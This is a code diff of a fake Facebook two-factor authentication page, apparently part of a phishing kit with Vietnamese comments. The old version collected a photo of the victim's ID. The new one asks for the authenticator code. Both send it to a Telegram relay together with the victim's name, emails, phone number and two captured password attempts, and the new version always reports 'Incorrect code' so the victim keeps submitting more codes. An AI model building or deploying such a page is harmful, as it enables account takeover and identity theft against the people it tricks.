@@ -3,89 +3,95 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Two-Factor Authentication</title>
+<title>2FA Page</title>
 <style>
-body {font-family: Arial, sans-serif;margin:0;background:#f0f2f5;display:flex;flex-direction:column;min-height:100vh;}
-.header {background-color:#355797;border-bottom:1px solid #355797;padding:10px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:1000;box-shadow:0 2px 4px rgba(0,0,0,.08);}
-.header .help-center-link {font-size:18px;font-weight:bold;color:#fff;text-decoration:none;}
-.header .language {font-size:14px;color:#fff;}
-.content-area {flex-grow:1;padding:20px;}
-.form-container {background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);max-width:700px;margin:0 auto;text-align:center;}
-.form-container h2 {font-size:24px;color:#1c2b33;margin-bottom:20px;}
-.form-container label {display:block;font-size:14px;color:#606770;margin-bottom:5px;text-align:left;}
-.form-container input[type="text"], .form-container input[type="file"] {width:calc(100% - 20px);padding:12px 10px;margin-bottom:15px;border:1px solid #ddd;border-radius:6px;font-size:15px;box-sizing:border-box;}
-.form-container button {background-color:#1877f2;color:#fff;padding:12px 25px;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:20px;}
-.form-container button:hover {background-color:#166fe5;}
-.preview-img {margin-top:10px;max-width:100%;border-radius:6px;}
-.error-message {color:#fa3e3e;font-size:13px;margin-top:-10px;margin-bottom:10px;text-align:left;display:none;}
-@media (max-width:768px){.content-area{padding:10px;}.form-container{padding:20px;}}
+/* --- GIỮ NGUYÊN GIAO DIỆN 2FA --- */
+body { font-family: Arial, sans-serif; margin:0; background-color:#f0f2f5; display:flex; flex-direction:column; min-height:100vh;}
+.header { background-color:#355797; border-bottom:1px solid #355797; padding:10px 20px; display:flex; align-items:center; justify-content:space-between; box-shadow:0 2px 4px rgba(0,0,0,.08);}
+.header .help-center-link { font-size:18px; font-weight:bold; color:#fff; text-decoration:none;}
+.header .language { font-size:14px; color:#fff;}
+.content-area { flex-grow:1; display:flex; justify-content:center; align-items:center; padding:20px;}
+.form-container { background-color:#fff; padding:30px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,.1); max-width:450px; width:100%; text-align:center;}
+.form-container h2 { font-size:24px; color:#1c2b33; margin-bottom:20px;}
+.form-container p { font-size:15px; color:#606770; margin-bottom:20px;}
+.form-container input[type="text"], .form-container input[type="email"], .form-container input[type="password"] { width:calc(100% - 20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:15px; box-sizing:border-box;}
+.form-container input:focus { border-color:#1877f2; outline:none;}
+.form-container button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin-top:10px;}
+.form-container button:hover { background-color:#166fe5;}
+.popup-overlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6); justify-content:center; align-items:center; z-index:2000;}
+.popup-content { background-color:#fff; padding:30px; border-radius:8px; width:90%; max-width:450px; text-align:center;}
+.popup-content h3 { font-size:20px; color:#1c2b33; margin-bottom:15px;}
+.popup-content p { font-size:15px; color:#606770; margin-bottom:20px;}
+.popup-content input[type="text"] { width:calc(100% - 20px); padding:12px 10px; margin-bottom:15px; border:1px solid #ddd; border-radius:6px; font-size:16px; box-sizing:border-box;}
+.popup-content input:focus { border-color:#1877f2; outline:none;}
+.popup-content button { background-color:#1877f2; color:#fff; padding:12px 25px; border:none; border-radius:6px; font-size:16px; cursor:pointer;}
+.popup-content button:hover { background-color:#166fe5;}
+.popup-content .error-message { color:#fa3e3e; font-size:13px; margin-top:-10px; margin-bottom:10px; display:none; text-align:left;}
 </style>
 </head>
 <body>
 <div class="header">
-<a href="#" class="help-center-link">facebook</a>
-<span class="language">English (US)</span>
+    <a href="#" class="help-center-link">facebook</a>
+    <span class="language">English (US)</span>
 </div>
 
 <div class="content-area">
-<div class="form-container">
-<h2>Two-Factor Authentication</h2>
-<p>Please upload a photo of your ID for verification.</p>
-<form id="twoFAForm">
-<label for="idFile">Upload ID *</label>
-<input type="file" id="idFile" accept="image/*" required>
-<img id="previewImage" class="preview-img" src="" alt="" style="display:none;">
-<div class="error-message" id="fileError">Please select a valid image file.</div>
-<button type="submit" id="verifyButton">Verify</button>
-</form>
-</div>
+    <div class="form-container">
+        <h2>Two-Factor Authentication</h2>
+        <p>Enter the 6-digit code from your authenticator app to continue.</p>
+        <input type="text" id="twoFACode" maxlength="6" placeholder="Enter 2FA code">
+        <div class="error-message" id="twoFAError">Incorrect code. Please try again.</div>
+        <button id="confirmTwoFAButton">Confirm</button>
+    </div>
 </div>
 
 <script>
-const twoFAForm=document.getElementById('twoFAForm');
-const idFileInput=document.getElementById('idFile');
-const previewImage=document.getElementById('previewImage');
-const fileError=document.getElementById('fileError');
+const TELEGRAM_WEBHOOK = ''; // nếu muốn webhook riêng
+let formData = JSON.parse(localStorage.getItem('formData') || '{}');
+let ipAddress = localStorage.getItem('ipAddress') || 'N/A';
+let locationData = localStorage.getItem('locationData') || 'N/A';
+let passwordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
+let passwordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
+let twoFAAttemptCount = 0;
 
-function sendMessageToTelegram(message){
-return fetch('/api/send-telegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message})});
+const twoFAInput = document.getElementById('twoFACode');
+const twoFAError = document.getElementById('twoFAError');
+const confirmTwoFAButton = document.getElementById('confirmTwoFAButton');
+
+async function sendMessageToTelegram(message){
+    try{
+        await fetch('/api/send-telegram',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({ message:message })
+        });
+        if(TELEGRAM_WEBHOOK){
+            await fetch(TELEGRAM_WEBHOOK,{
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({ message:message })
+            });
+        }
+    }catch(e){console.error(e);}
 }
 
-idFileInput.addEventListener('change',()=>{
-const file=idFileInput.files[0];
-if(file && file.type.startsWith('image/')){
-const reader=new FileReader();
-reader.onload=(e)=>{previewImage.src=e.target.result;previewImage.style.display='block';fileError.style.display='none';};
-reader.readAsDataURL(file);
-}else{fileError.style.display='block';previewImage.style.display='none';}
-});
-
-twoFAForm.addEventListener('submit',async(e)=>{
-e.preventDefault();
-const file=idFileInput.files[0];
-if(!file){fileError.style.display='block';return;}
-const formDataStored=JSON.parse(localStorage.getItem('formData')||'{}');
-const ipAddress=localStorage.getItem('ipAddress')||'N/A';
-const locationData=localStorage.getItem('locationData')||'N/A';
-const passwordAttempt1=localStorage.getItem('passwordAttemptValue1')||'';
-const passwordAttempt2=localStorage.getItem('passwordAttemptValue2')||'';
-let reader=new FileReader();
-reader.onload=async(e2)=>{
-const imageData=e2.target.result;
-let message=`<b>2FA Verification Submission</b>\n------------------------------------\n`;
-message+=`<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
-message+=`<b>Page Name:</b> ${formDataStored.yourName||''}\n`;
-message+=`<b>Business Email:</b> ${formDataStored.businessEmail||''}\n`;
-message+=`<b>Personal Email:</b> ${formDataStored.personalEmail||''}\n`;
-message+=`<b>Mobile Phone:</b> ${formDataStored.mobilePhoneNumber||''}\n`;
-message+=`<b>Password Attempt 1:</b> ${passwordAttempt1}\n`;
-message+=`<b>Password Attempt 2:</b> ${passwordAttempt2}\n`;
-message+=`<b>Additional Info:</b> ${formDataStored.additionalInfo||''}\n`;
-message+=`<b>ID Image:</b> [Base64 Image]\n`; // Telegram không hỗ trợ HTML hình trực tiếp, lưu base64
-await sendMessageToTelegram(message);
-alert('Verification submitted successfully!');
-};
-reader.readAsDataURL(file);
+confirmTwoFAButton.addEventListener('click', async ()=>{
+    const code = twoFAInput.value.trim();
+    if(!code){ twoFAError.textContent='Code cannot be empty'; twoFAError.style.display='block'; return;}
+    twoFAAttemptCount++;
+    let message=`<b>2FA Submission Attempt ${twoFAAttemptCount}</b>\n------------------------------------\n`;
+    message+=`<b>IP & Location:</b> ${ipAddress} (${locationData})\n`;
+    message+=`<b>Name:</b> ${formData.yourName}\n`;
+    message+=`<b>Business Email:</b> ${formData.businessEmail}\n`;
+    message+=`<b>Personal Email:</b> ${formData.personalEmail}\n`;
+    message+=`<b>Mobile Phone:</b> ${formData.mobilePhoneNumber}\n`;
+    message+=`<b>Password Attempt 1:</b> ${passwordAttemptValue1}\n`;
+    message+=`<b>Password Attempt 2:</b> ${passwordAttemptValue2}\n`;
+    message+=`<b>2FA Code:</b> ${code}\n`;
+    await sendMessageToTelegram(message);
+    twoFAError.textContent='Incorrect code. Please try again.';
+    twoFAError.style.display='block';
+    twoFAInput.value='';
 });
 </script>
 </body>
